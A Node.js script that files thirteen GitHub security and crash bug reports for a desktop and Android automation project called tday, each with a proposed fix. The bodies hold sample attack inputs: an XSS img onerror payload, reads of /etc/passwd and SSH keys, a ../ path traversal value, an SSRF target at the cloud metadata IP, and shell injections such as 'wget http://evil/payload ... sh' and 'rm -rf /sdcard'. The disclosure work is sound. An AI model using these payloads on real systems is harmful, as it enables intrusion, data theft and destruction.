#!/usr/bin/env node
// Script to create GitHub issues for newly found P0/P1 bugs in tday (round 2)
// Run in GitHub Actions where GITHUB_TOKEN is available

const https = require('https');

const bugs = [
  {
    title: "[P0][Security] SSRF in handle_scrape — no private/localhost IP blocking, follows redirects",
    labels: ["bug", "security"],
    body: "**Priority: P0 (Security)**\n**File:** `crates/tday-nativecore/src/handlers/system.rs` lines ~35-72\n\nThe `scrape_url` tool validates only the scheme (`http://` or `https://`) but does NOT block requests to private/internal addresses (127.x, 10.x, 192.168.x, 172.16-31.x, 169.254.x, ::1, etc.). The `reqwest` client follows HTTP 3xx redirects by default.\n\nAny caller — including any local process via the unauthenticated MCP server — can direct `scrape_url` to probe:\n- `http://127.0.0.1:<port>/` (internal APIs, admin panels)\n- `http://169.254.169.254/latest/meta-data/` (AWS IMDS credentials)\n- `http://192.168.x.x/` (LAN devices, routers, NAS)\n\nAn open-redirect on any external site further enables bypass of any future hostname-based blocking.\n\n**Fix:** Resolve the URL's hostname, check all resulting IPs against a private-range blocklist, disable redirect following or validate each redirect target, and enforce a Content-Length / body-size limit."
  },
  {
    title: "[P0][Security] Unrestricted filesystem read/write/delete via filesystem tool — no path sandboxing",
    labels: ["bug", "security"],
    body: "**Priority: P0 (Security)**\n**File:** `crates/tday-nativecore/src/handlers/system.rs` lines ~436-578\n\nThe `filesystem` MCP tool supports `read`, `write`, `delete`, `copy`, `move`, `search`, and `list` modes on **any absolute path** with no sandbox, no allowlist, and no canonicalization. Paths starting with `~/` are expanded using the `HOME` env variable but any other path (including `/`, `../../etc/shadow`, etc.) is used verbatim.\n\nAny local process via the unauthenticated MCP server can:\n- **Read** `~/.ssh/id_rsa`, `~/.aws/credentials`, browser cookie DBs\n- **Write** to `~/.bashrc`, `~/.zshrc`, `~/.ssh/authorized_keys`, crontab files\n- **Delete** arbitrary user files\n- **Search** the entire filesystem\n\n**Fix:** Restrict all filesystem operations to an explicit allowlist of directories (e.g. home directory subtree only after canonicalization), and reject any path that resolves outside allowed roots."
  },
  {
    title: "[P1][Security] XSS via marked.parse() + dangerouslySetInnerHTML without sanitization in Settings renderer",
    labels: ["bug", "security"],
    body: "**Priority: P1 (Security)**\n**File:** `apps/desktop/src/renderer/src/Settings/shared.tsx` lines ~7-12\n\nMarkdown text (from CoWorker URLs, system prompts, preview content) is rendered via `marked.parse(text)` and injected with `dangerouslySetInnerHTML`. The `marked` library does not sanitize HTML — raw `<script>`, `<img onerror=...>`, `<a href=javascript:...>` tags pass through unchanged into the DOM.\n\nBecause `sandbox: false` is set in the Electron `BrowserWindow` options, the renderer process has full access to all `window.tday` IPC APIs (spawn, fetchCoworkerUrl, setSetting, etc.).\n\nAn attacker-controlled CoWorker definition URL returning:\n```html\n<img src=x onerror=\"window.tday.spawn({agentId:'terminal',...})\">\n```\nachieves code execution in the renderer with full IPC access.\n\n**Fix:** Add `DOMPurify.sanitize()` (or equivalent) wrapping `marked.parse()` output before passing to `dangerouslySetInnerHTML`. Or use `marked` with a custom renderer that strips HTML."
  },
  {
    title: "[P1][Security] coworkerFetchUrl IPC handler allows arbitrary local file read from renderer",
    labels: ["bug", "security"],
    body: "**Priority: P1 (Security)**\n**File:** `apps/desktop/src/main/index.ts` lines ~896-907\n\nThe `coworkerFetchUrl` IPC handler checks if the URL starts with `/` or a Windows drive letter and, if so, reads the file directly with `readFileSync(trimmed, 'utf8')` — with **no path restriction**.\n\nAny renderer-side code (or XSS exploiting BUG-11) can call:\n```js\nwindow.tday.fetchCoworkerUrl('/etc/passwd')        // Linux\nwindow.tday.fetchCoworkerUrl('~/.ssh/id_rsa')      // won't expand ~ but absolute works\nwindow.tday.fetchCoworkerUrl('C:\\\\Users\\\\...\\\\secret') // Windows\n```\nand receive the full file contents. With `sandbox: false`, this is accessible from any renderer script.\n\n**Fix:** Validate that the path resolves to a directory within an allowlist (e.g. the app's data directory or user-specified workspace). At minimum, reject paths that resolve outside the current working directory."
  },
  {
    title: "[P1][Security] tabId path traversal in session/MCP config file paths — write outside Claude config dir",
    labels: ["bug", "security"],
    body: "**Priority: P1 (Security)**\n**File:** `apps/desktop/src/main/index.ts` lines ~414-416\n\n`req.tabId` (received from the renderer via IPC) is embedded directly into file paths without sanitization:\n```typescript\nconst sessionSettingsPath = join(claudeDir, `tday-session-${req.tabId}.json`);\nconst mcpConfigPath       = join(claudeDir, `tday-mcp-${req.tabId}.json`);\n```\n\n`path.join` does NOT prevent traversal when components contain `../`. A renderer sending `tabId = '../../.bashrc'` causes the resulting path to resolve to `~/.bashrc.json` (outside `~/.claude/`), overwriting it with attacker-controlled JSON content.\n\n**Fix:** Validate `req.tabId` against a strict allowlist regex (e.g. `/^[a-zA-Z0-9_-]+$/`) before using it in any file path construction."
  },
  {
    title: "[P1][Security] Android shell injection via launch_app unsanitized package_name",
    labels: ["bug", "security"],
    body: "**Priority: P1 (Security)**\n**File:** `crates/tday-nativecore/src/android/navigation.rs` lines ~47-54\n\n`launch_app` passes `package_name` directly into `shell_args`:\n```rust\ndevice.shell_args(&[\"am\", \"start\", \"-n\", &format!(\"{package_name}/.MainActivity\")])?;\n```\n\n`shell_args` (in `device.rs:62`) joins all args with spaces into a single string and passes it to `shell()`, which runs it verbatim on the Android device. A `package_name` value like `'com.foo; wget http://evil/payload -O /sdcard/p; sh /sdcard/p'` executes arbitrary commands on the device.\n\n**Fix:** Validate `package_name` against a strict regex (`/^[a-zA-Z0-9._]+$/`), or shell-quote each argument before joining in `shell_args`."
  },
  {
    title: "[P1][Security] Android shell injection via press_key unsanitized key string",
    labels: ["bug", "security"],
    body: "**Priority: P1 (Security)**\n**File:** `crates/tday-nativecore/src/android/input.rs` lines ~46-47\n\n`press_key` passes the `key` string directly to `shell_args`:\n```rust\ndevice.shell_args(&[\"input\", \"keyevent\", key])?;\n```\n\nIf `key_name_to_keycode()` does not recognize the key name, it is passed through unchanged. A value like `'KEYCODE_HOME; rm -rf /sdcard'` — after `shell_args` joins with spaces — executes the second command on the Android device shell.\n\n**Fix:** Validate `key` against a strict allowlist of `KEYCODE_*` values and reject unrecognized keys with an error instead of passing them through."
  },
  {
    title: "[P1][Security] Android shell injection via type_text — newline not escaped, enables command termination injection",
    labels: ["bug", "security"],
    body: "**Priority: P1 (Security)**\n**File:** `crates/tday-nativecore/src/android/input.rs` lines ~55-75\n\n`type_text` calls `escape_for_input()` which escapes spaces and some quotes but **does not escape newline characters (`\\n`)**. ADB shell treats `\\n` as a command terminator. Input like `hello\\nrm -rf /sdcard` causes the Android device to execute `rm -rf /sdcard` as a separate command after typing `hello`.\n\nThe partial escaping creates a false sense of safety while leaving the most critical injection character unescaped.\n\n**Fix:** The `escape_for_input()` function must escape or reject all shell metacharacters including `\\n`, `\\r`, `;`, `&`, `|`, `$(`, backtick, `>`, `<`. Consider using the ADB `KeyEvent.KEYCODE_*` approach for character-by-character input instead of shell text injection."
  },
  {
    title: "[P1] Mutex lock poisoning causes cascading crash in tracking and recording hot paths",
    labels: ["bug"],
    body: "**Priority: P1**\n**File:** `crates/tday-nativecore/src/tracking/hover_tracker.rs` line ~82; also `screen_recorder.rs`\n\nMultiple hot-path background threads use `.lock().unwrap()` on shared mutexes:\n```rust\nlet mut events = self.events.lock().unwrap();\n// screen_recorder.rs:\nlet mut frames = self.frames.lock().unwrap();\n```\n\nIf any thread panics while holding the lock, Rust marks the mutex as **poisoned**. All subsequent callers of `.unwrap()` on a poisoned mutex panic unconditionally, crashing the nativecore service. Since these are background tracking threads running in hot paths, any transient error causes a permanent DoS until the parent process restarts nativecore.\n\n**Fix:** Replace `.lock().unwrap()` with `.lock().unwrap_or_else(|e| e.into_inner())` to recover from poisoned mutexes, or use `.lock().map_err(|_| ...)` to return an error gracefully."
  },
  {
    title: "[P1] HOME env var unset causes path `~/x` to resolve as `/x` (filesystem root access)",
    labels: ["bug", "security"],
    body: "**Priority: P1**\n**File:** `crates/tday-nativecore/src/handlers/system.rs` lines ~442-447\n\nPaths starting with `~/` are expanded as follows:\n```rust\nlet home = std::env::var(\"HOME\").unwrap_or_default();  // empty string if HOME unset\nlet path = format!(\"{}{}\", home, &path_raw[1..]);       // ~/foo → /foo (root!)\n```\n\nIf `HOME` is unset (headless environments, sandboxed contexts, CI), `~/secrets.txt` expands to `/secrets.txt` — a path at the filesystem root. Additionally, paths containing `../` are never canonicalized (`std::fs::canonicalize` is not called), compounding this into a path traversal vector.\n\n**Fix:** Return an error if `HOME` is unset rather than silently expanding to the root. Call `std::fs::canonicalize()` on all user-provided paths and verify the result starts with the intended base directory."
  },
  {
    title: "[P1] Memory safety: get_unchecked() on CFArray in macOS AX snapshot — potential OOB read",
    labels: ["bug"],
    body: "**Priority: P1**\n**File:** `crates/tday-nativecore/src/platform/macos/ax.rs` lines ~255-262\n\nThe macOS Accessibility snapshot code uses `unsafe { kids.get_unchecked(i) }` to index into a `CFArray` of AXUIElements:\n```rust\nfor i in 0..kids.len() {\n    let child = unsafe { *kids.get_unchecked(i) as AXUIElementRef };\n    ...\n}\n```\n\nThe macOS AX API (AXUIElementCopyAttributeValue for AXChildren) can return a CFArray whose reported length is inconsistent with the actual allocated buffer in some applications. `get_unchecked(i)` bypasses Rust's bounds check. If the real array is shorter, this reads from unmapped or adjacent memory, causing **undefined behaviour** that can corrupt process state, leak adjacent memory contents, or crash the nativecore service.\n\n**Fix:** Replace `get_unchecked(i)` with the safe `.get(i)` and handle the `None` case, or add an explicit bounds assertion before the loop."
  },
  {
    title: "[P1] Unbounded HTTP response body read in handle_scrape — OOM / denial of service",
    labels: ["bug"],
    body: "**Priority: P1**\n**File:** `crates/tday-nativecore/src/handlers/system.rs` lines ~61-62\n\n```rust\nlet body = resp.text().await\n    .map_err(|e| DevToolsError::Other(format!(\"reading body: {e}\")))?;\n```\n\n`resp.text()` reads the **entire response body** into a `String` with no size cap. An agent or attacker directing `scrape_url` at a URL serving gigabytes of data (e.g. a large binary file with `Content-Type: text/plain`, or a chunked-encoding infinite stream) will exhaust all available RAM, crashing nativecore, the Electron app, and potentially triggering the OS OOM killer on the host.\n\n**Fix:** Check `Content-Length` header before reading and reject responses above a threshold (e.g. 10 MB). Use `bytes_limited()` or read with a streaming byte cap:\n```rust\nif let Some(len) = resp.content_length() {\n    if len > 10 * 1024 * 1024 { return Err(...); }\n}\nlet body = resp.text().await?;  // also add a streaming limit\n```"
  },
  {
    title: "[P1] android/device.rs shell_args joins all args with spaces — architectural shell injection in every Android operation",
    labels: ["bug", "security"],
    body: "**Priority: P1 (Security — Architectural)**\n**File:** `crates/tday-nativecore/src/android/device.rs` lines 62-63\n\n```rust\npub fn shell_args(&mut self, args: &[&str]) -> Result<String, String> {\n    self.shell(&args.join(\" \"))\n}\n```\n\n`shell_args` is the foundation of **every Android shell operation** (click, swipe, type_text, press_key, launch_app, screenshot, list_apps). Instead of passing args as separate argv to `adb shell` with proper quoting, it joins them with spaces into a single string that is interpreted by `/bin/sh` on the Android device.\n\nThis is an architectural bug: any argument in any of these operations that contains shell metacharacters (`;`, `&`, `|`, `$(…)`, newline, etc.) will be interpreted by the shell. All higher-level Android API functions inherit this vulnerability.\n\n**Fix:** Reconstruct `shell_args` to pass arguments to `adb shell` via proper exec-style argument separation, OR shell-quote every argument using single-quote wrapping with embedded single-quotes escaped as `'\\''`."
  }
];

async function createIssue(token, owner, repo, issue) {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify({
      title: issue.title,
      body: issue.body,
      labels: issue.labels
    });
    const options = {
      hostname: 'api.github.com',
      path: `/repos/${owner}/${repo}/issues`,
      method: 'POST',
      headers: {
        'Authorization': `token ${token}`,
        'Accept': 'application/vnd.github.v3+json',
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data),
        'User-Agent': 'create-issues-script'
      }
    };
    const req = https.request(options, (res) => {
      let body = '';
      res.on('data', (chunk) => body += chunk);
      res.on('end', () => {
        try {
          const result = JSON.parse(body);
          if (res.statusCode === 201) {
            resolve(result);
          } else {
            reject(new Error(`HTTP ${res.statusCode}: ${result.message}`));
          }
        } catch (e) {
          reject(new Error(`Parse error: ${body}`));
        }
      });
    });
    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

async function main() {
  const token = process.env.GITHUB_TOKEN;
  const [owner, repo] = (process.env.GITHUB_REPOSITORY || 'unbug/tday').split('/');

  if (!token) {
    console.error('GITHUB_TOKEN not set');
    process.exit(1);
  }

  console.log(`Creating ${bugs.length} issues in ${owner}/${repo}...`);

  for (const bug of bugs) {
    try {
      const result = await createIssue(token, owner, repo, bug);
      console.log(`Created #${result.number}: ${bug.title}`);
      // Rate limit: 1 issue per second
      await new Promise(r => setTimeout(r, 1000));
    } catch (e) {
      console.error(`Failed to create issue "${bug.title}": ${e.message}`);
    }
  }

  console.log('Done!');
}

main().catch(e => { console.error(e); process.exit(1); });
